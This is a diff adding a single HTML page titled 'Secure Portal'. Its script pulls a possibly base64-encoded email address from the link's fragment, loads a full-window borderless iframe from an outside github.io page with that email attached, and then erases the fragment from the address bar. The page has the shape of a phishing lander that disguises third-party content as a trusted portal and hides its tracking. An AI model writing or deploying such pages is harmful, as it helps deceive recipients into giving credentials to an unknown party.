@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Secure Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      overflow: hidden;
+      background: #f9f9f9;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+  <iframe id="real-frame" src=""></iframe>
+
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      function decodeIfBase64(str) {
+        try {
+          const decoded = atob(str);
+          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+            return decoded;
+          }
+        } catch (e) {}
+        return str;
+      }
+
+      function getEmail() {
+        const url = new URL(window.location.href);
+        const hashRaw = url.hash.slice(1);
+        return decodeIfBase64(decodeURIComponent(hashRaw));
+      }
+
+      const email = getEmail();
+      const iframe = document.getElementById("real-frame");
+
+      if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        iframe.src = "https://lucicaborza.github.io/maningdesp/index.html#" + email;
+      } else {
+        iframe.src = "https://lucicaborza.github.io/maningdesp/index.html";
+      }
+
+      // ✅ Clean the outer URL
+      history.replaceState(null, null, window.location.pathname);
+    });
+  </script>
+</body>
+</html>
